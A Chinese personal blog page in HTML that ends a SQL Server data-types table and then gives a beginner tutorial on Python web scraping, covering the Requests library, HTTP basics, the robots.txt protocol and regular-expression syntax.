<td>char数据类型用来存储指定长度的定长非统一编码型的数据。当定义一列为此类型时，你必须指定列长。当你总能知道要存储的数据的长度时，此数据类型很有用。例如，当你按邮政编码加4个字符格式来存储数据时，你知道总要用到10个字符。此数据类型的列宽最大为8000 个字符</td>
</tr>
<tr>
<td>varchar</td>
<td>字符型</td>
<td>varchar数据类型，同char类型一样，用来存储非统一编码型字符数据。与char 型不一样，此数据类型为变长。当定义一列为该数据类型时，你要指定该列的最大长度。 它与char数据类型最大的区别是，存储的长度不是列长，而是数据的长度</td>
</tr>
<tr>
<td>text</td>
<td>字符型</td>
<td>text 数据类型用来存储大量的非统一编码型字符数据。这种数据类型最多可以有2^31-1或20亿个字符</td>
</tr>
<tr>
<td>nchar</td>
<td>统一编码字符型</td>
<td>nchar 数据类型用来存储定长统一编码字符型数据。统一编码用双字节结构来存储每个字符，而不是用单字节(普通文本中的情况)。它允许大量的扩展字符。此数据类型能存储4000种字符，使用的字节空间上增加了一倍</td>
</tr>
<tr>
<td>nvarchar</td>
<td>统一编码字符型</td>
<td>nvarchar 数据类型用作变长的统一编码字符型数据。此数据类型能存储4000种字符，使用的字节空间增加了一倍</td>
</tr>
<tr>
<td>ntext</td>
<td>统一编码字符型</td>
<td>ntext 数据类型用来存储大量的统一编码字符型数据。这种数据类型能存储2^30 -1或将近10亿个字符，且使用的字节空间增加了一倍</td>
</tr>
<tr>
<td>binary</td>
<td>二进制数据类型</td>
<td>binary数据类型用来存储可达8000 字节长的定长的二进制数据。当输入表的内容接近相同的长度时，你应该使用这种数据类型</td>
</tr>
<tr>
<td>varbinary</td>
<td>二进制数据类型</td>
<td>varbinary 数据类型用来存储可达8000 字节长的变长的二进制数据。当输入表的内容大小可变时，你应该使用这种数据类型</td>
</tr>
<tr>
<td>image</td>
<td>二进制数据类型</td>
<td>image 数据类型用来存储变长的二进制数据，最大可达2^31-1或大约20亿字节</td>
</tr>
</tbody></table>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/01/python3网络爬虫与信息提取/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/01/python3网络爬虫与信息提取/" itemprop="url">python3网络爬虫与信息提取</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-01T16:55:34+08:00">
                2019-07-01
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/07/01/python3网络爬虫与信息提取/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/07/01/python3网络爬虫与信息提取/" class="cy_cmt_count" data-xid="2019/07/01/python3网络爬虫与信息提取/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/07/01/python3网络爬虫与信息提取/" class="leancloud_visitors" data-flag-title="python3网络爬虫与信息提取">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h1 id="python3网络爬虫与信息提取"><a href="#python3网络爬虫与信息提取" class="headerlink" title="python3网络爬虫与信息提取"></a>python3网络爬虫与信息提取</h1><h3 id="1-体系结构"><a href="#1-体系结构" class="headerlink" title="1.体系结构"></a>1.体系结构</h3><h6 id="1-1-Requests框架：自动抓取HTML页面与自动网络请求提交"><a href="#1-1-Requests框架：自动抓取HTML页面与自动网络请求提交" class="headerlink" title="1.1 Requests框架：自动抓取HTML页面与自动网络请求提交"></a>1.1 Requests框架：自动抓取HTML页面与自动网络请求提交</h6><h6 id="1-2-robots-txt-网络爬虫排除标准（从该文件中也可知道存在什么目录）"><a href="#1-2-robots-txt-网络爬虫排除标准（从该文件中也可知道存在什么目录）" class="headerlink" title="1.2 robots.txt:网络爬虫排除标准（从该文件中也可知道存在什么目录）"></a>1.2 robots.txt:网络爬虫排除标准（从该文件中也可知道存在什么目录）</h6><h6 id="1-3-BeautifulSoup框架：解析HTML页面"><a href="#1-3-BeautifulSoup框架：解析HTML页面" class="headerlink" title="1.3 BeautifulSoup框架：解析HTML页面"></a>1.3 BeautifulSoup框架：解析HTML页面</h6><h6 id="1-4-RE框架：正则框架，提取页面关键信息"><a href="#1-4-RE框架：正则框架，提取页面关键信息" class="headerlink" title="1.4 RE框架：正则框架，提取页面关键信息"></a>1.4 RE框架：正则框架，提取页面关键信息</h6><h6 id="1-5-Scrapy框架：网络爬虫原理介绍，专业爬虫框架"><a href="#1-5-Scrapy框架：网络爬虫原理介绍，专业爬虫框架" class="headerlink" title="1.5 Scrapy框架：网络爬虫原理介绍，专业爬虫框架"></a>1.5 Scrapy框架：网络爬虫原理介绍，专业爬虫框架</h6><h3 id="2-Requests库"><a href="#2-Requests库" class="headerlink" title="2.Requests库"></a>2.Requests库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span>	requests</span><br><span class="line">r = requests.get(<span class="string">"http://www.baidu.com"</span>) <span class="comment">#抓取页面</span></span><br><span class="line">status = r.status_code <span class="comment">#查看状态码</span></span><br><span class="line">print(<span class="string">"状态码为%s"</span>%status)</span><br><span class="line">r.encoding = <span class="string">'utf-8'</span> <span class="comment">#进行utf-8转码</span></span><br><span class="line"><span class="keyword">print</span> (r.text)</span><br></pre></td></tr></table></figure>

<p>Requests库的7种主要方法</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>requests.request()</td>
<td>构造一个请求，支撑以下各个方法的基础方法</td>
</tr>
<tr>
<td>requests.get()</td>
<td>获取HTML网页的主要方法，对应于HTTP的GET</td>
</tr>
<tr>
<td>r = requests.get(‘url’,timeout=1)</td>
<td>设置秒数超时，仅对于连接有效</td>
</tr>
<tr>
<td>requests.head()</td>
<td>获取HTML网页头信息的方法，对应HTTP的HEAR</td>
</tr>
<tr>
<td>requests.post()</td>
<td>向HTML网页提交POST请求的方法，对应HTTP的POST</td>
</tr>
<tr>
<td>requests.put()</td>
<td>向HTML网页提交PUT请求的方法，对应HTTP的PUT</td>
</tr>
<tr>
<td>requests.patch()</td>
<td>向HTML网页提交局部修改请求，对应HTTP的PATCH</td>
</tr>
<tr>
<td>requests.delete()</td>
<td>向HTML网页提交删除请求,对应HTTP的DELETE</td>
</tr>
</tbody></table>
<ul>
<li><h5 id="Requests-get方法："><a href="#Requests-get方法：" class="headerlink" title="Requests.get方法："></a>Requests.get方法：</h5></li>
</ul>
<h6 id="r-requests-get-url-："><a href="#r-requests-get-url-：" class="headerlink" title="r=requests.get(url)："></a>r=requests.get(url)：</h6><p>get()方法构造一个向服务器请求资源的request对象，返回一个包含服务器资源的Response对象。</p>
<h6 id="requests-get-url-params-None-kwargs-："><a href="#requests-get-url-params-None-kwargs-：" class="headerlink" title="requests.get(url,params=None,**kwargs)："></a>requests.get(url,params=None,**kwargs)：</h6><p>url:拟获要抓取的url链接</p>
<p>params:url额外参数，字典或字节流格式，可选</p>
<p>**kwargs:12个访问控制参数</p>
<ul>
<li><h5 id="Requests库的两个重要对象"><a href="#Requests库的两个重要对象" class="headerlink" title="Requests库的两个重要对象"></a>Requests库的两个重要对象</h5></li>
</ul>
<p>Response:Response对象包含爬虫返回的内容</p>
<ul>
<li><h5 id="Response对象属性"><a href="#Response对象属性" class="headerlink" title="Response对象属性"></a>Response对象属性</h5></li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>r.status_code</td>
<td>HTTP请求返回状态，200表示成功，404表示失败（1XX表示正常处理，2XX表示成功状态，3XX表示需请求进行下一步，4XX表示客户端问题，5XX表示服务端问题）</td>
</tr>
<tr>
<td>r.raise_for_status()</td>
<td>失败请求非200响应则抛出异常</td>
</tr>
<tr>
<td>r.text</td>
<td>HTTP响应内容的字符串形式，即url对应的页面内容</td>
</tr>
<tr>
<td>r.headers</td>
<td>以字典对象存储服务器响应头，但是这个字典比较特殊，字典键不区分大小写，若键不存在则返回None</td>
</tr>
<tr>
<td>r.requests.headers</td>
<td>返回发送到服务器的头信息</td>
</tr>
<tr>
<td>r.cookies</td>
<td>返回cookie值</td>
</tr>
<tr>
<td>r.history</td>
<td>返回重定向信息,当然可以在请求是加上allow_redirects = false 阻止重定向</td>
</tr>
<tr>
<td>r.raw</td>
<td>返回原始响应体，也就是 urllib 的 response 对象，使用 r.raw.read()</td>
</tr>
<tr>
<td>r.ok</td>
<td>查看r.ok的布尔值便可以知道是否登陆成功</td>
</tr>
<tr>
<td>r.encoding</td>
<td>从HTTP header中猜测的相应内容编码方式，进行返回内容的转码（获取当前编码），如r.encoding = ‘utf-8’（设置编码）</td>
</tr>
<tr>
<td>r.apparent_encoding</td>
<td>从内容中分析出相应的内容编码方式（备选编码方式）</td>
</tr>
<tr>
<td>r.content</td>
<td>HTTP响应内容的二进制形式</td>
</tr>
<tr>
<td>r.json()</td>
<td>Requests中内置的JSON解码器，以json形式返回,前提返回的内容确保是json格式的，不然解析出错会抛异常</td>
</tr>
<tr>
<td>r.apparent_encoding</td>
<td>根据网页内容分析出的编码方式可以 看作是r.encoding的备选。</td>
</tr>
</tbody></table>
<ul>
<li><h5 id="Requests库的异常"><a href="#Requests库的异常" class="headerlink" title="Requests库的异常"></a>Requests库的异常</h5></li>
</ul>
<table>
<thead>
<tr>
<th>异常</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>requests.ConnectionError</td>
<td>网络连接错误异常，如DNS查询失败拒绝连接等</td>
</tr>
<tr>
<td>requests.HTTPError</td>
<td>HTTP错误异常</td>
</tr>
<tr>
<td>requests.URLRequired</td>
<td>URL缺失异常</td>
</tr>
<tr>
<td>requests.ToolManyRedirects</td>
<td>超过最大重定向次数，产生重定向异常</td>
</tr>
<tr>
<td>requests.ConnectTimeout</td>
<td>连接远程服务器超时异常</td>
</tr>
<tr>
<td>requests.Timeout</td>
<td>请求URL超时，尝试超时异常</td>
</tr>
</tbody></table>
<p>测试代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()    <span class="comment"># 如果状态不是200，引发HTTPError异常</span></span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"产生异常"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    url = <span class="string">"http://www.baidu1.com"</span></span><br><span class="line">    print(getHTMLText(url))</span><br></pre></td></tr></table></figure>

<h2 id="3-HTTP简单理解"><a href="#3-HTTP简单理解" class="headerlink" title="3.HTTP简单理解"></a>3.HTTP简单理解</h2><table>
<thead>
<tr>
<th>协议类型</th>
<th>区别</th>
</tr>
</thead>
<tbody><tr>
<td>HTTP1.0</td>
<td>1.0规定浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接，服务器完成请求处理后立即断开TCP连接，服务器不跟踪每个客户也不记录过去的请求。（多个TCP连接，多请求，使用后关闭）</td>
</tr>
<tr>
<td>HTTP2.0</td>
<td>1.1则支持持久连接Persistent Connection, 并且默认使用persistent  connection. 在同一个tcp的连接中可以传送多个HTTP请求和响应. 多个请求和响应可以重叠，多个请求和响应可以同时进行. 更加多的请求头和响应头(比如HTTP1.0没有host的字段).（单个TCP隧道，默认长连接，多请求。需有“Connection: close字段”，才会进行连接的关闭）通过cookie进行身份认证。</td>
</tr>
</tbody></table>
<p>在1.0时的会话方式：</p>
<ol>
<li><p>建立连接</p>
</li>
<li><p>发出请求信息</p>
</li>
<li><p>回送响应信息</p>
</li>
<li><p>关掉连接</p>
<p><strong>HTTP 1.1的持续连接，也需要增加新的请求头来帮助实现，例如，Connection请求头的值为Keep-Alive时，客户端通知服务器返回本次请求结果后保持连接；Connection请求头的值为close时，客户端通知服务器返回本次请求结果后关闭连接。**</strong>HTTP 1.1还提供了与身份认证、状态管理和Cache缓存等机制相关的请求头和响应头。</p>
</li>
</ol>
<p>请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟。例如：一个包含有许多图像的网页文件的多个请求和应答可以在一个连接中传输，但每个单独的网页文件的请求和应答仍然需要使用各自的连接。  HTTP 1.1还允许客户端不用等待上一次请求结果返回，就可以发出下一次请求，但服务器端必须按照接收到客户端请求的先后顺序依次回送响应结果，以保证客户端能够区分出每次请求的响应内容。</p>
<p><strong>2.HTTP 1.1增加host字段</strong></p>
<p>在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。</p>
<p> HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。此外，服务器应该接受以绝对路径标记的资源请求。</p>
<p><strong>3.100(Continue) Status(节约带宽)</strong></p>
<p>HTTP/1.1加入了一个新的状态码100（Continue）。客户端事先发送一个只带头域的请求，如果服务器因为权限拒绝了请求，就回送响应码401（Unauthorized）；如果服务器接收此请求就回送响应码100，客户端就可以继续发送带实体的完整请求了。100 (Continue) 状态代码的使用，允许客户端在发request消息body之前先用request header试探一下server，看server要不要接收request body，再决定要不要发request body。</p>
<p><strong>4</strong>.HTTP/1.1中引入了Chunked transfer-coding来解决上面这个问题，发送方将消息分割成若干个任意大小的数据块，每个数据块在发送时都会附上块的长度，最后用一个零长度的块作为消息结束的标志。这种方法允许发送方只缓冲消息的一个片段，避免缓冲整个消息带来的过载。</p>
<p><strong>5</strong>.HTTP/1.1在1.0的基础上加入了一些cache的新特性，当缓存对象的Age超过Expire时变为stale对象，cache不需要直接抛弃stale对象，而是与源服务器进行重新激活（revalidation）</p>
<h5 id="HTTP协议对资源的操作"><a href="#HTTP协议对资源的操作" class="headerlink" title="HTTP协议对资源的操作"></a>HTTP协议对资源的操作</h5><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>GET</td>
<td>请求获取URL位置的资源</td>
</tr>
<tr>
<td>HEAD</td>
<td>请求获取URL位置资源的响应消息报告，即获得该资源的头部信息</td>
</tr>
<tr>
<td>POST</td>
<td>请求向URL位置的资源后附加新的数据</td>
</tr>
<tr>
<td>PUT</td>
<td>请求向URL位置存储一个资源，覆盖原URL位置资源</td>
</tr>
<tr>
<td>PATCH</td>
<td>请求局部更新URL位置的资源，即改变该处资源的部分内容</td>
</tr>
<tr>
<td>DELETE</td>
<td>请求删除URL位置存储的资源</td>
</tr>
</tbody></table>
<h5 id="理解PATCH和PUT区别"><a href="#理解PATCH和PUT区别" class="headerlink" title="理解PATCH和PUT区别"></a>理解PATCH和PUT区别</h5><p>　假设URL位置有一组数据UserInfo，包括UserID、UserName等20个字段。<br>　需求：用户修改了UserName，其他不变。<br>　　　　· 采用PATCH，仅向URL提交UserName的局部更新请求。<br>　　　　· 采用PUT，必须将所有20个字段一并提交到URL，未提交字段被删除。</p>
<p>　PATCH的主要好处：节省网络带宽</p>
<h5 id="Requests库主要方法解析"><a href="#Requests库主要方法解析" class="headerlink" title="Requests库主要方法解析"></a>Requests库主要方法解析</h5><p>requests.request(method, url, **kwargs)</p>
<ol>
<li><p>method：请求方式，对应get/put/post等7种<br>　例： r = requests.request(‘OPTIONS’, url, **kwargs)</p>
</li>
<li><p>url：拟获取页面的url链接</p>
</li>
<li><p>**kwargs：控制访问的参数，共13个，均为可选项</p>
</li>
</ol>
<ul>
<li>params：字典或字节序列，作为参数增加到url中；</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">kv = &#123;<span class="string">'key1'</span>:<span class="string">'value1'</span>, <span class="string">'key2'</span>:<span class="string">'value2'</span>&#125;</span><br><span class="line">r = requests.request(<span class="string">'GET'</span>, <span class="string">'http://python123.io/ws'</span>,params=kv)</span><br><span class="line">print(r.url)</span><br><span class="line"><span class="comment">#下面内容为返回内容</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">http://python123.io/ws?key1=value1&amp;key2=value2</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>data：字典、字节序列或文件对象，作为Request的内容；</p>
</li>
<li><p>json：JSON格式的数据，作为Request的内容；</p>
</li>
<li><p>headers：字典，HTTP定制头；</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hd = &#123;<span class="string">'user-agent'</span>:<span class="string">'Chrome/10'</span>&#125;</span><br><span class="line">r = requests.request(<span class="string">'POST'</span>,<span class="string">'http://www.yanlei.shop'</span>,headers=hd)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>cookies：字典或CookieJar，Request中的cookie；</p>
</li>
<li><p>auth：元组，支持HTTP认证功能；</p>
</li>
<li><p>files：字典类型，传输文件；</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fs = &#123;<span class="string">'file'</span>:open(<span class="string">'data.xls'</span>, <span class="string">'rb'</span>)&#125;</span><br><span class="line">r = requests.request(<span class="string">'POST'</span>,<span class="string">'http://python123.io/ws'</span>,files=fs)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>timeout：设定超时时间，秒为单位；</p>
</li>
<li><p>proxies：字典类型，设定访问代理服务器，可以增加登录认证</p>
</li>
<li><p>allow_redirects：True/False，默认为True，重定向开关；</p>
</li>
<li><p>stream：True/False，默认为True，获取内容立即下载开关；</p>
</li>
<li><p>verify：True/False，默认为True，认证SSL证书开关；</p>
</li>
<li><p>cert：本地SSL证书路径</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#方法及参数</span></span><br><span class="line">requests.get(url, params=<span class="literal">None</span>, **kwargs)</span><br><span class="line">requests.head(url, **kwargs)</span><br><span class="line">requests.post(url, data=<span class="literal">None</span>, json=<span class="literal">None</span>, **kwargs)</span><br><span class="line">requests.put(url, data=<span class="literal">None</span>, **kwargs)</span><br><span class="line">requests.patch(url, data=<span class="literal">None</span>, **kwargs)</span><br><span class="line">requests.delete(url, **kwargs)</span><br></pre></td></tr></table></figure>

<h3 id="4-Robots协议"><a href="#4-Robots协议" class="headerlink" title="4.Robots协议"></a>4.Robots协议</h3><p>Robots Exclusion Standard 网络爬虫排除标准</p>
<p>​    作用：网站告知网络爬虫哪些页面可以抓取，哪些不行。<br>　形式：在网站根目录下的robots.txt文件。<br>　案例：京东的Robots协议<br>　<a href="http://www.jd.com/robots.txt" target="_blank" rel="noopener">http://www.jd.com/robots.txt</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 注释：*代表所有，/代表根目录</span><br><span class="line">User-agent: * </span><br><span class="line">Disallow: /?* </span><br><span class="line">Disallow: /pop/*.html </span><br><span class="line">Disallow: /pinpai/*.html?* </span><br><span class="line">User-agent: EtaoSpider </span><br><span class="line">Disallow: / </span><br><span class="line">User-agent: HuihuiSpider </span><br><span class="line">Disallow: / </span><br><span class="line">User-agent: GwdangSpider </span><br><span class="line">Disallow: / </span><br><span class="line">User-agent: WochachaSpider </span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure>

<h5 id="Robots协议的使用"><a href="#Robots协议的使用" class="headerlink" title="Robots协议的使用"></a>Robots协议的使用</h5><p>  网络爬虫：自动或人工识别robots.txt，再进行内容爬取。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565232827562.png" alt="1565232827562"></p>
<p>约束性：Robots协议是建议但非约束性，网络爬虫可以不遵守，但存在法律风险。</p>
<h3 id="5-正则表达式"><a href="#5-正则表达式" class="headerlink" title="5.正则表达式"></a>5.正则表达式</h3><p>正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p>
<h4 id="非打印字符"><a href="#非打印字符" class="headerlink" title="非打印字符"></a>非打印字符</h4><p>非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列：</p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">\cx</td>
<td align="left">匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td>
</tr>
<tr>
<td align="left">\f</td>
<td align="left">匹配一个换页符。等价于 \x0c 和 \cL。</td>
</tr>
<tr>
<td align="left">\n</td>
<td align="left">匹配一个换行符。等价于 \x0a 和 \cJ。</td>
</tr>
<tr>
<td align="left">\r</td>
<td align="left">匹配一个回车符。等价于 \x0d 和 \cM。</td>
</tr>
<tr>
<td align="left">\s</td>
<td align="left">匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。注意 Unicode 正则表达式会匹配全角空格符。</td>
</tr>
<tr>
<td align="left">\S</td>
<td align="left">匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</td>
</tr>
<tr>
<td align="left">\t</td>
<td align="left">匹配一个制表符。等价于 \x09 和 \cI。</td>
</tr>
<tr>
<td align="left">\v</td>
<td align="left">匹配一个垂直制表符。等价于 \x0b 和 \cK。</td>
</tr>
</tbody></table>
<h4 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h4><p>所谓特殊字符，就是一些有特殊含义的字符，如上面说的 <strong>runoo*b</strong> 中的 <strong><strong>*，简单的说就是表示任何字符串的意思。如果要查找字符串中的 *</strong></strong> 符号，则需要对 <strong>*** 进行转义，即在其前加一个 **\</strong>: <strong>runo*ob</strong> 匹配 runo*ob。</p>
<p>许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符<strong>\</strong> 放在它们前面。下表列出了正则表达式中的特殊字符：</p>
<table>
<thead>
<tr>
<th align="left">特别字符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$</td>
<td align="left">匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 $。</td>
</tr>
<tr>
<td align="left">( )</td>
<td align="left">标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 *。</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 . 。</td>
</tr>
<tr>
<td align="left">[</td>
<td align="left">标记一个中括号表达式的开始。要匹配 [，请使用 [。</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。</td>
</tr>
<tr>
<td align="left">\</td>
<td align="left">将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">匹配输入字符串的开始位置，除非在方括号表达式中使用，此时它表示不接受该字符集合。要匹配 ^ 字符本身，请使用 ^。</td>
</tr>
<tr>
<td align="left">{</td>
<td align="left">标记限定符表达式的开始。要匹配 {，请使用 {。</td>
</tr>
<tr>
<td align="left">|</td>
<td align="left">指明两项之间的一个选择。要匹配 |，请使用 |。</td>
</tr>
</tbody></table>
<h4 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h4><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 <strong>*** 或 **+</strong> 或 <strong>?</strong> 或 <strong>{n}</strong> 或 <strong>{n,}</strong> 或 <strong>{n,m}</strong> 共6种。</p>
<p>正则表达式的限定符有：</p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">*</td>
<td align="left">匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td>
</tr>
<tr>
<td align="left">{n}</td>
<td align="left">n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td>
</tr>
<tr>
<td align="left">{n,}</td>
<td align="left">n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td>
</tr>
<tr>
<td align="left">{n,m}</td>
<td align="left">m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
</tr>
</tbody></table>
<h4 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h4><p>定位符使您能够将正则表达式固定到行首或行尾。它们还使您能够创建这样的正则表达式，这些正则表达式出现在一个单词内、在一个单词的开头或者一个单词的结尾。</p>
